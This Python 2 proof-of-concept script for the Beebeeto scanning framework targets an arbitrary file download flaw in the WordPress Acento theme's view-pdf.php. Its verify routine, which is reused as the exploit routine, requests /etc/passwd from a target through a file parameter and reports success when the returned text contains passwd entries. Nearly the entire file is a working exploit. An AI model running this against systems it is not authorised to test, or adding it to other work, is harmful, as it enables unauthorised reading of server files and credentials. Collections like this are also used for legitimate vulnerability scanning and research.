#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0022',
            'name': 'WordPress Acento Theme Arbitrary File Download POC',
            'author': 'flsf',
            'create_date': '2014-09-23',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': [''],
            'type': 'Arbitrary File Download',
            'tag': ['WordPress', '/wp-content/themes/acento/includes/view-pdf.php', 'Arbitrary File Download'],
            'desc': 'wp主题插件acento theme 中view-pad.php 文件,可读取任意文件',
            'references': ['http://www.exploit-db.com/exploits/34578/',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + "/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/etc/passwd"
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = urllib2.Request(verify_url)
        response = urllib2.urlopen(request)
        content = response.read()
        if 'root:' in content and 'nobody:' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
